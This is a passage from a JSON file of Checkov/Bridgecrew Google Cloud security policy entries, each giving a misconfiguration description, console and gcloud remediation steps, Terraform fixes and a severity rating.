        "description": "GCP HTTPS load balancer is configured with SSL policy having TLS version 1.1 or lower\nDescription\nSecure Sockets Layer (SSL) policies determine what port Transport Layer Security (TLS) features clients are permitted to use when connecting to load balancers. SSL policies control the features of SSL in Google Cloud SSL proxy load balancer and external HTTP(S) load balancers. By default, HTTP(S) Load Balancing and SSL Proxy Load Balancing use a set of SSL features that provides good security and wide compatibility. \nTo prevent usage of insecure features, SSL policies should use one of the following three options:\n\nAt least TLS 1.2 with the MODERN profile; or \nThe RESTRICTED profile, because it effectively requires clients to use TLS 1.2 regardless of the chosen minimum TLS version; or \nA CUSTOM profile that does not support any of the following features:\n\n\nTLS_RSA_WITH_AES_128_GCM_SHA256\nTLS_RSA_WITH_AES_256_GCM_SHA384\nTLS_RSA_WITH_AES_128_CBC_SHA\nTLS_RSA_WITH_AES_256_CBC_SHA\nTLS_RSA_WITH_3DES_EDE_CBC_SHA\n\nLoad balancers are used to efficiently distribute traffic across multiple servers. Both SSL proxy and HTTPS load balancers are external load balancers: they distribute traffic from the Internet to a GCP network. GCP customers can configure load balancer SSL policies with a minimum TLS version (1.0, 1.1, or 1.2) that clients can use to establish a connection, along with a profile (Compatible, Modern, Restricted, or Custom) that specifies permissible and insecure cipher suites. It is easy for customers to configure a load balancer without knowing they are permitting outdated cipher suites.\nIt is possible to define SSL policies to control the features of SSL that your load balancer negotiates with clients. An SSL policy can be configured to determine the minimum TLS version and SSL features that are enabled in the load balancer. We recommend you select TLS 1.2 as the minimum TLS version supported.\nFix - Runtime \nGCP Console\nIf the TargetSSLProxy or TargetHttpsProxy does not have an SSL policy configured, create a new SSL policy. Otherwise, modify the existing insecure policy.\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to SSL Policies.\nClick on the name of the insecure policy to go to its SSL policy details page.\nClick EDIT.\nSet Minimum TLS version to TLS 1.2.\nSet Profile to Modern or Restricted.\nAlternatively, if the user selects the profile Custom, make sure that the following features are disabled:\n\n\nTLS_RSA_WITH_AES_128_GCM_SHA256\nTLS_RSA_WITH_AES_256_GCM_SHA384\nTLS_RSA_WITH_AES_128_CBC_SHA\nTLS_RSA_WITH_AES_256_CBC_SHA\nTLS_RSA_WITH_3DES_EDE_CBC_SHA\n\nCLI Command\n\nFor each insecure SSL policy, update it to use secure cyphers:\n\ngcloud compute ssl-policies update NAME \n[--profile COMPATIBLE|MODERN|RESTRICTED|CUSTOM] \n--min-tls-version 1.2 [--custom-features FEATURES]\n\n\nIf the target proxy has a GCP default SSL policy, use the following command corresponding to the proxy type to update it:\n\ngcloud compute target-ssl-proxies update TARGET_SSL_PROXY_NAME \n--ssl-policy SSL_POLICY_NAME\ngcloud compute target-https-proxies update TARGET_HTTPS_POLICY_NAME \n--sslpolicy SSL_POLICY_NAME\n\nFix - Buildtime \nTerraform\n\n\nResource: google_compute_ssl_policy\n\n\nArgument: profile = MODERN\n\n\nResource: google_compute_ssl_policy\n\n\nArguments:\nprofile = CUSTOM\ncustom_features = []\n\n\nGo//Option 1\nresource \"google_compute_ssl_policy\" \"modern-profile\" {\n  name            = \"nonprod-ssl-policy\"\n+ profile         = \"MODERN\"\n+ min_tls_version = \"TLS_1_2\"\n}\n\n//Option 2\nresource \"google_compute_ssl_policy\" \"custom-profile\" {\n  name            = \"custom-ssl-policy\"\n+ profile         = \"CUSTOM\"\n  min_tls_version = \"TLS_1_2\"\n+ custom_features = [\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\"]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_11": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_4",
        "description": "Cloud SQL database instances are publicly accessible\nDescription\nCloud SQL is a fully managed relational database service for MySQL, PostgreSQL, and SQL Server. It offers data encryption at rest and in transit, Private connectivity with VPC and user-controlled network access with firewall protection.\nIt is possible to configure Cloud SQL to have a public IPv4 address. This means your cluster can accept connections from specific IP addresses, or a range of addresses, by adding authorized addresses to your instance. We do not recommend this option. \nWe recommend you ensure Cloud SQL Database Instances are not publicly accessible, to help secure against attackers scanning the internet in search of public databases.\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to the Cloud SQL Instances page.\nClick the instance name to open its Overview page.\nSelect the Connections tab.\nSelect Private IP checkbox.\nA drop-down list shows the available networks in your project. If your project is the service project of a Shared VPC, VPC networks from the host project are also shown.\n\nIf you have configured private services access:\nSelect the VPC Network you want to use\n\nA drop-down shows the IP address range you allocated.\nClick Connect.\nClick Save.\n\nTo let Cloud SQL allocate an IP address for you.\n\nSelect the default VPC network.\nClick Allocate and connect.\nClick Save.\n\nCLI Command\nVPC_NETWORK_NAME is the name of your chosen VPC network, for example: my-vpc-network. The --network parameter value is in the format: https://www.googleapis.com/compute/alpha/projects/[PROJECT_ID]/global/networks/[VPC_NETWORK_NAME]\nShellgcloud --project=[PROJECT_ID] beta sql instances patch [INSTANCE_ID]\n       --network=[VPC_NETWORK_NAME]\n       --no-assign-ip\n\nFix - Buildtime \nTerraform\n\nResource: google_compute_network\nArgument: private_network (Optional)\nThe VPC network from which the Cloud SQL instance is accessible for private IP. For example, projects/myProject/global/networks/default. Specifying a network enables private IP. Either ipv4_enabled must be enabled or a private_network must be configured. This setting can be updated, but it cannot be removed after it is set.\n\nGoresource \"google_compute_network\" \"private_network\" {\n  provider = google-beta\n\n  name = \"private-network\"\n}\n\nresource \"google_compute_global_address\" \"private_ip_address\" {\n  provider = google-beta\n\n  name          = \"private-ip-address\"\n  purpose       = \"VPC_PEERING\"\n  address_type  = \"INTERNAL\"\n  prefix_length = 16\n  network       = google_compute_network.private_network.id\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_16": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_5",
        "description": "GCP Cloud DNS has DNSSEC disabled\nDescription\nDNSSEC is a feature of the Domain Name System that authenticates responses to domain name lookups. DNSSEC prevents attackers from manipulating or poisoning the responses to DNS requests. \nWe recommend you ensure DNSSEC is enabled in: any public DNS zone, the top level domain registry, and in the local DNS resolvers.\n\ud83d\udcd8NoteIf visibility is set to private, then DNSSEC cannot be set, and this policy will pass.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nClick the DNSSEC setting for the existing managed zone.\nSelect \"On\" in the pop-up menu.\nIn the confirmation dialog, click Enable.\n\nCLI Command\nYou can enable DNSSEC for existing managed zones using the gcloud command line tool or the API:\ngcloud dns managed-zones update EXAMPLE_ZONE --dnssec-state on\nFix - Buildtime\nTerraform\n\nResource: google_dns_managed_zone\nArgument: dnssec_config (Optional)\nDNSSEC configuration Structure is documented below.\n\nGoresource \"google_dns_managed_zone\" \"example\" {\n        description  = \"Company Domain name\"\n        dns_name     = \"example.com.\"\n        \n      + dnssec_config { # forces replacement\n          + kind          = \"dns#managedZoneDnsSecConfig\" # forces replacement\n          + non_existence = \"nsec3\" # forces replacement\n          + state         = \"on\" # forces replacement\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_17": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_6",
        "description": "RSASHA1 is used for Zone-Signing and Key-Signing Keys in Cloud DNS DNSSEC\nDescription\nDNSSEC is a feature of the Domain Name System (DNS) that authenticates responses to domain name lookups. There are several advanced DNSSEC configuration options you can use if DNSSEC is enabled for your managed zones. These include: unique signing algorithms, denial of existence and the ability to use record types that require or recommend DNSSEC for their use.\nWhen enabling DNSSEC for a managed zone, or creating a managed zone with DNSSEC, you can select the DNSSEC signing algorithms and the denial-of-existence type. We do not recommend you use RSASHA1 unless you need it for compatibility reasons; there is no security advantage to using it with larger key lengths.\nFix - Buildtime \nTerraform\n\nResource: google_dns_managed_zone\nArguments:\nzone_signing_keys - A list of Zone-signing key (ZSK) records. Structure is documented below.\nkey_signing_keys - A list of Key-signing key (KSK) records. Structure is documented below. \n\nAdditionally, the DS record is provided:\nThe key_signing_keys and zone_signing_keys block supports:\nalgorithm - String mnemonic specifying the DNSSEC algorithm of this key. Immutable after creation time. Possible values are ecdsap256sha256, ecdsap384sha384, rsasha1, rsasha256, and rsasha512.\nGoresource \"google_dns_managed_zone\" \"foo\" {\n  name     = \"foobar\"\n  dns_name = \"foo.bar.\"\n\n  zone_signing_keys {\n-   algorithm = \"rsasha1\"\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_27": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_7",
        "description": "Default network exists in a project\nDescription\nThe default network has a pre-configured network configuration and automatically generates the following insecure firewall rules:\n\ndefault-allow-internal: Allows ingress connections for all protocols and ports among instances in the network.\ndefault-allow-ssh: Allows ingress connections on TCP port 22(SSH) from any source to any instance in the network.\ndefault-allow-rdp: Allows ingress connections on TCP port 3389(RDP) from any source to any instance in the network.\ndefault-allow-icmp: Allows ingress ICMP traffic from any source to any instance in\nthe network.\n\nThese automatically created firewall rules do not get audit logged and cannot be configured to enable firewall rule logging. In addition, the default network is an auto mode network, which means that its subnets use the same predefined range of IP addresses. As a result, it is not possible to use Cloud VPN or VPC Network Peering with the default network.\nWe recommend that a project should not have a default network to prevent use of default network. Based on organization security and networking requirements, the organization should create a new network and delete the default network.\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VPC networks.\nClick the network named default.\nOn the network detail page, click EDIT.\nClick DELETE VPC NETWORK.\nIf needed, create a new network to replace the default network.\n\nCLI Command\nFor each Google Cloud Platform project:\n\nDelete the default network:\ngcloud compute networks delete default\nIf needed, create a new network to replace it:\ngcloud compute networks create <network name>\n\nFix - Buildtime \nTerraform\n\nResource: google_project\nArgument: auto_create_network\n\nGoresource \"google_project\" \"my_project\" {\n  name       = \"My Project\"\n  project_id = \"your-project-id\"\n  org_id     = \"1234567\"\n+ auto_create_network   = false\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_32": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_8",
        "description": "GCP VM instances have block project-wide SSH keys feature disabled\nDescription\nProject-wide SSH keys are stored in Compute/Project-meta-data. Project wide SSH keys can be used to login into all instances within a project. Using project-wide SSH keys eases SSH key management. If SSH keys are compromised, the potential security risk can impact all instances within a project. \nWe recommend you use Instance specific SSH keys instead of common/shared project-wide SSH key(s), to limit the attack surface should the SSH keys be compromised.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VM instances.\nList all the instances in your project.\nClick the name of the Impacted instance.\nClick Edit in the toolbar.\nUnder SSH Keys, navigate to Block project-wide SSH keys .\nTo block users with project-wide SSH keys from connecting to this instance, select Block project-wide SSH keys.\nAt the bottom of the page, click Save.\n\nRepeat these steps for each impacted Instance.\nCLI Command\nTo block project-wide public SSH keys, set the metadata value to TRUE using the following command:\ngcloud compute instances add-metadata INSTANCE_NAME \n--metadata block-projectssh-keys=TRUE\n\nFix - Buildtime \nTerraform\n\nResource: google_compute_instance\nField: metadata\nArgument: block-project-ssh-keys\n\nGoresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  metadata = {\n+     block-project-ssh-keys = true\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_33": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_9",
        "description": "GCP projects have OS login disabled\nDescription\nEnabling OSLogin ensures that SSH keys used to connect to instances are mapped with IAM users. Revoking access to IAM user will revoke all the SSH keys associated with that particular user. It facilitates centralized and automated SSH key pair management. This is useful in handling cases such as response to compromised SSH key pairs and/or revocation of external/third-party/Vendor users.\nWe recommend you enable OSLogin to bind SSH certificates to IAM users and facilitates effective SSH certificate management.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Metadata.\nClick Edit.\nAdd a metadata entry where the key is enable-oslogin and the value is TRUE.\nTo apply changes, click Save.\nFor every instances that overrides the project setting, go to the VM Instances page\nat https://console.cloud.google.com/compute/instances.\nClick the name of the instance on which you want to remove the metadata value.\nTo edit the instance settings go to the top of the instance details page and click Edit.\nUnder Custom metadata, remove any entry with key enable-oslogin and the value\nis FALSE.\nTo apply your changes to the instance, navigate to the bottom of the instance details page and click Save.\n\nCLI Command\n\nConfigure oslogin on the project using the following command:\n\ngcloud compute project-info add-metadata --metadata enable-oslogin=TRUE\n\n\nRemove instance metadata that overrides the project setting, using the following command:\n\ngcloud compute instances remove-metadata INSTANCE_NAME --keys=enable-oslogin\n\nOptionally, you can enable two factor authentication for OS login. For more information, see https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.\nFix - Buildtime \nTerraform\n\n\nResource: google_compute_project_metadata\n\n\nArgument: enable-oslogin\n\n\nResource: google_compute_instance\n\n\nArgument: enable-oslogin\nShould not override project metadata: should not be set to false.\n\n\nGo//Option 1\nresource \"google_compute_project_metadata\" \"default\" {\n  metadata = {\n+    enable-oslogin = true\n  }\n}\n\n//Option 2\nresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {}\n  metadata = {\n-     enable-oslogin = false\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_34": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_10",
        "description": "Project instance overrides the project setting enabling OSLogin\nDescription\nEnabling OSLogin ensures that SSH keys used to connect to instances are mapped with IAM users. Revoking access to IAM user will revoke all the SSH keys associated with that particular user. It facilitates centralized and automated SSH key pair management. This is useful in handling cases such as response to compromised SSH key pairs and/or revocation of external/third-party/Vendor users.\nWe recommend you enable OSLogin to bind SSH certificates to IAM users and facilitates effective SSH certificate management.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Metadata.\nClick Edit.\nAdd a metadata entry where the key is enable-oslogin and the value is TRUE.\nTo apply changes, click Save.\nFor every instances that overrides the project setting, go to the VM Instances page\nat https://console.cloud.google.com/compute/instances.\nClick the name of the instance on which you want to remove the metadata value.\nTo edit the instance settings go to the top of the instance details page and click Edit.\nUnder Custom metadata, remove any entry with key enable-oslogin and the value\nis FALSE.\nTo apply your changes to the instance, navigate to the bottom of the instance details page and click Save.\n\nCLI Command\n\nTo configure oslogin on the project, use the following command:\n\ngcloud compute project-info add-metadata --metadata enable-oslogin=TRUE\n\n\nTo remove instance metadata that overrides the project setting, use the following command:\n\ngcloud compute instances remove-metadata INSTANCE_NAME --keys=enable-oslogin\n\nOptionally, you can enable two factor authentication for OS login. For more information, see https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.\nFix - Buildtime \nTerraform\n\n\nResource: google_compute_project_metadata\n\n\nArgument: enable-oslogin\n\n\nResource: google_compute_instance\n\n\nArgument: enable-oslogin\nShould not override project metadata: should not be set to false.\n\n\nGo//Option 1\nresource \"google_compute_project_metadata\" \"default\" {\n  metadata = {\n+    enable-oslogin = true\n  }\n}\n\n//Option 2\nresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {}\n  metadata = {\n-     enable-oslogin = false\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_35": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_11",
        "description": "GCP VM instances have serial port access enabled\nDescription\nInteracting with a serial port is often referred to as the serial console. It is similar to using a terminal window: input and output is entirely in text mode with no graphical interface or mouse support. If the interactive serial console on an instance is enabled, clients can attempt to connect to that instance from any IP address. For security purposes interactive serial console support should be disabled.\nA virtual machine instance has four virtual serial ports. Interacting with a serial port is similar to using a terminal window: input and output is entirely in text mode with no graphical interface or mouse support. The instance's BIOS operating system and other system-level entities write output to the serial ports and accept input, for example, commands and responses to prompts. Typically, these system-level entities use the first serial port (port 1). Serial port 1 is often referred to as the serial console.\nThe interactive serial console does not support IP-based access restrictions, for example, an IP whitelist. If you enable the interactive serial console on an instance, clients can connect to that instance from any IP address. This allows anybody with the correct SSH key, username, project ID, zone, and instance name to connect to that instance. To stop this type of access interactive serial console support should be disabled.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Computer Engine.\nNavigate to VM instances.\nSelect the specific VM.  \nClick Edit.\nClear the checkbox Enable connecting to serial ports, located below the Remote access block.\nClick Save.\n\nCLI Command\nTo disable an instance use one of the following commands: \ngcloud compute instances add-metadata INSTANCE_NAME \n--zone=ZONE \n--metadata=serial-port-enable=false\n\nOR\ngcloud compute instances add-metadata INSTANCE_NAME \n--zone=ZONE \n--metadata=serial-port-enable=0\n\nFix - Buildtime \nTerraform\n\nResource: google_compute_instance\nArgument: serial-port-enable\nBy default set to false.\n\nGoresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {}\n  metadata = {\n-     serial-port-enable = true\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_36": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_12",
        "description": "IP forwarding on instances is enabled\nDescription\nThe Compute Engine instance cannot forward a packet unless the source IP address of the packet matches the IP address of the instance. GCP will not deliver a packet with a destination IP address different to the IP address of the instance receiving the packet. Both capabilities are required when using instances to help route packets. \nTo enable this source and destination IP check, disable the canIpForward field. The canIpForward field allows an instance to send and receive packets with non-matching destination or source IPs.\nWe recommend the forwarding of data packets be disabled to prevent data loss and information disclosure.\nFix - Runtime \nGCP Console\nThe canIpForward setting  can only be edited at instance creation time. It is recommended to\ndelete the instance and create a new one with canIpForward set to False.\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VM instances.\nSelect the VM Instance to remediate.\nClick Delete.\nOn the VM Instances page, click CREATE INSTANCE.\nCreate a new instance with the desired configuration. \n\n\ud83d\udcd8NoteBy default, a new instance is configured to not allow IP forwarding.\nCLI Command\n\n\nTo delete an instance, use the following command:\ngcloud compute instances delete INSTANCE_NAME\n\n\nTo create a new instance to replace it with IP forwarding set to Off, use the following command:\ngcloud compute instances create\n\n\nFix - Buildtime \nTerraform\n\nResource: google_compute_instance\nArgument: can_ip_forward\nBy default set to false.\n\nGoresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n- can_ip_forward = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_37": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_general_x",
        "description": "GCP VM disks not encrypted with CSEKs\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical VM disks. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nGCP Console\nCurrently there is no way to update the encryption of an existing disk.\nEnsure you create new disks with Encryption set to Customer supplied.\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Compute Engine Disks.\nClick CREATE DISK.\nSet Encryption type to Customer supplied.\nIn the dialog box, enter the Key.\nSelect Wrapped key.\nClick Create.\n\nCLI Command\nIn the gcloud compute tool, encrypt a disk, use the following command:\n--csek-key-file flag during instance creation\nIf you are using an RSA-wrapped key, use the gcloud beta component and the following command:\ngcloud (beta) compute instances create INSTANCE_NAME \n--csek-key-file <example-file.json>\n\nTo encrypt a standalone persistent disk, use the following command:\ngcloud (beta) compute disks create DISK_NAME \n--csek-key-file <examplefile.json>\n\nFix - Buildtime \nTerraform\n\nResource: google_compute_disk\nField: disk_encryption_key\n\nGo// Option 1\nresource \"google_compute_disk\" \"default\" {\n\n  ...\n  \n+  disk_encryption_key {\n+    raw_key = <raw key>\n  or\n+    kms_key_self_link = <key link>\n    }\n +  boot_disk {\n +    disk_encryption_key_raw = <encryption key>\n    }\n\n}\n// Option 2\nresource \"google_compute_instance\" \"default\" {\n  \n  ...\n  \n+  boot_disk {\n+    disk_encryption_key_raw = <encryption key>\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_38": {
        "url": "https://docs.bridgecrew.io/docs/encrypt-boot-disks-for-instances-with-cseks",
        "description": "Boot disks for instances do not use CSEKs\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt boot disks for instances. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nGCP Console\nCurrently there is no way to update the encryption of an existing disk.\nEnsure you create new disks with Encryption set to Customer supplied.\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Compute Engine Disks.\nClick CREATE DISK.\nSet Encryption type to Customer supplied.\nIn the dialog box, enter the Key.\nSelect Wrapped key.\nClick Create.\n\nCLI Command\nIn the gcloud compute tool, encrypt a disk, use the following command:\n--csek-key-file flag during instance creation\nIf you are using an RSA-wrapped key, use the gcloud beta component and the following command:\ngcloud (beta) compute instances create INSTANCE_NAME --csek-key-file <example-file.json>\nTo encrypt a standalone persistent disk, use the following command:\ngcloud (beta) compute disks create DISK_NAME --csek-key-file <examplefile.json>\nFix - Buildtime \nTerraform\n\n\nResource: google_compute_disk\n\n\nField: disk_encryption_key\n\n\nResource: google_compute_instance\n\n\nArgument: boot_disk:disk_encryption_key_raw\n\n\nGo//Option 2\nresource \"google_compute_disk\" \"default\" {\n  name  = \"test-disk\"\n  type  = \"pd-ssd\"\n  zone  = \"us-central1-a\"\n  image = \"debian-8-jessie-v20170523\"\n  physical_block_size_bytes = 4096\n+  disk_encryption_key {\n+    raw_key = <raw key>\n  or\n+    kms_key_self_link = <key link>\n    }\n}\n\n//Option 2\nresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {\n    disk_encryption_key_raw = <encryption key>\n    }\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_39": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_general_y",
        "description": "Compute instances launch without shielded VM enabled\nDescription\nShielded VMs are virtual machines (VMs) on a Google Cloud Platform hardened by a set of security controls that help defend against rootkits and bootkits. Shielded VM offers verifiable integrity on your Compute Engine VM instances, so you can be confident your instances have not been compromised by boot- or kernel-level malware or rootkits. The verifiable integrity of a Shielded VM is achieved through the use of Secure Boot and integrity monitoring, see below for further details.\nWe recommend you launch Compute instances with Shielded VM enabled to defend against advanced threats, and ensure that the boot loader and firmware on your VMs are signed and untampered. Shielded VM instances run firmware signed and verified using Google's Certificate Authority, ensuring the instance's firmware is unmodified and the root of trust for Secure Boot is established.\nSecure Boot is a virtual trusted platform module (vTPM)-enabled Measured Boot. It helps ensure that the system only runs authentic software by verifying the digital signature of all boot components and halting the boot process if signature verification fails.\nIntegrity monitoring helps you understand and make decisions about the state of your VM instances. The Shielded VM vTPM enables Measured Boot by performing the measurements needed to create the integrity policy baseline used for comparison with measurements from subsequent VM boots to determine any changes. \nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VM instances.\nSelect the instance name to view the VM instance details page.\nStop the instance, by clicking STOP.\nWhen the instance has stopped, click EDIT.\nIn the Shielded VM section, turn on both vTPM and Integrity Monitoring.\nOptionally, if you do not use any custom or unsigned drivers on the instance, turn on Secure Boot.\nTo modify the instance, click SAVE. \nTo restart the instance, click START.\n\nCLI Command\nYou can only enable Shielded VM options on instances that have Shielded VM support. For a list of Shielded VM public images, run the gcloud compute images list command with the following flags:\ngcloud compute images list --project gce-uefi-images --no-standard-images\n\n\nTo stop the instance, use the following command:\ngcloud compute instances stop INSTANCE_NAME\n\n\nTo update the instance, use the following command:\ngcloud compute instances update INSTANCE_NAME --shielded-vtpm --shielded-vmintegrity-monitoring\n\n\nOptionally, if you do not use any custom or unsigned drivers on the instance, to turn on secure boot use the following command:\ngcloud compute instances update INSTANCE_NAME --shielded-vm-secure-boot\n\n\nTo restart the instance, use the following command:\ngcloud compute instances start INSTANCE_NAME\n\n\nFix - Buildtime\nTerraform\n\nResource: google_compute_instance\nArguments:\nenable_integrity_monitoring - set to true by default, should not be overriden, i.e should not be set to false.\nenable_vtpm - set to true by default, should not be overriden, i.e should not be set to false.\n\nGoresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {}\n+    shielded_instance_config {\n-        enable_integrity_monitoring = false\n-        enable_vtpm                 = false\n        }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_43": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_general_4",
        "description": "GCP KMS encryption key is not rotating every 90 days\nDescription\nGoogle Cloud Key Management Service stores cryptographic keys in a hierarchical structure designed for access control management. The format for the rotation schedule depends on the client library used. In Terraform, the rotation period unit must be seconds.\nA key is a named object representing a cryptographic key used for a specific purpose, including data protection. The key material, the actual bits used for encryption, can change over time as new key versions are created. A collection of files could be encrypted with the same key and people with decrypt permissions on that key would be able to decrypt those files. \nWe recommend you set a key rotation period, including start time. A key can be created with a specified rotation period, which is the time when new key versions are generated automatically. A key can also be created with a specified next rotation time. \nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cryptographic Keys.\nSelect the specific key ring.\nFrom the list of keys, select the specific key and Click on the blade (3 dots) on the right side of the pop up.\nClick Edit rotation period.\nOn the pop-up window, Select a new rotation period in days; this should be less than 90 days. Then select a Starting on date; this is when the rotation period begins.\n\nCLI Command\nUpdate and schedule rotation by ROTATION_PERIOD and NEXT_ROTATION_TIME for each key:\ngcloud kms keys update new \n--keyring=KEY_RING \n--location=LOCATION \n--nextrotation-time=NEXT_ROTATION_TIME \n--rotation-period=ROTATION_PERIOD\n\nFix - Buildtime \nTerraform\n\nResource: google_kms_crypto_key\nArgument: rotation_period\n\nGoresource \"google_kms_crypto_key\" \"key\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n+ rotation_period = \"7776000s\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_6": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_general_1",
        "description": "Incoming connections to Cloud SQL database instances do not use SSL\nDescription\nCloud SQL is a fully managed relational database service for MySQL, PostgreSQL and SQL Server. It offers data encryption at rest and in transit, Private connectivity with VPC and user-controlled network access with firewall protection. Cloud SQL creates a server certificate automatically when a new instance is created. \nWe recommend you enforce all connections to use SSL/TLS.\nFix - Buildtime\nTerraform\nGoresource \"google_sql_database_instance\" \"main\" {\n  name             = \"main-instance\"\n  database_version = \"POSTGRES_14\"\n  region           = \"us-central1\"\n\n  settings {\n    # Second-generation instance tiers are based on the machine\n    # type. See argument reference below.\n    tier = \"db-f1-micro\"\n    ip_configuration {\n        require_ssl = true\n    }\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_14": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_general_2",
        "description": "Cloud SQL database instances do not have backup configuration enabled\nDescription\nCloud SQL is a fully managed relational database service for MySQL, PostgreSQL and SQL Server. It offers data encryption at rest and in transit, Private connectivity with VPC and user-controlled network access with firewall protection. Backups provide a way to restore a Cloud SQL instance to recover lost data or recover from a problem with your instance. \nWe recommend you enable automated backups for instances that contain data of high importance.\nGoresource \"google_sql_database_instance\" \"main\" {\n  name             = \"main-instance\"\n  database_version = \"POSTGRES_14\"\n  region           = \"us-central1\"\n  settings {\n    backup_configuration {\n        enabled = True\n    }\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_15": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_general_3",
